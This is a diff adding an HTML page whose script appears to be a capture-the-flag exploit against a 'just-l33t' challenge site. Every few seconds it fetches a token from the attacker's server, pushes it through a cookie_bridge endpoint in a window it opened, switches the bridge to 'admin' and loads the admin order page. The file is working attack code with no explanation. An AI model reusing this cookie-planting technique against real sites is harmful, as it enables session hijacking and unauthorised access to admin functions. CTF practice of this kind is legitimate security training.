@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        let w = window.open('http://to.just-l33t.fibonhack.it', 'leak');
+
+        setInterval(() => {
+            fetch('/place_cookie')
+                .then((response) => {
+                    response.text()
+                        .then((t) => {
+                            console.log("Gonna try with token", t);
+
+                            w.location.href = 'http://to.just-l33t.fibonhack.it/api/cookie_bridge?token=' + t;
+                            setTimeout(() => {
+                                w.location.href = 'http://to.just-l33t.fibonhack.it/api/cookie_bridge?to=admin'
+                                setTimeout(() => {
+                                    w.location.href = 'http://admin.just-l33t.fibonhack.it/order?order_id=1'
+                                }, 500)
+                            }, 500)
+                        })
+                })
+        }, 3000);
+
+    </script>
+</body>
+</html>
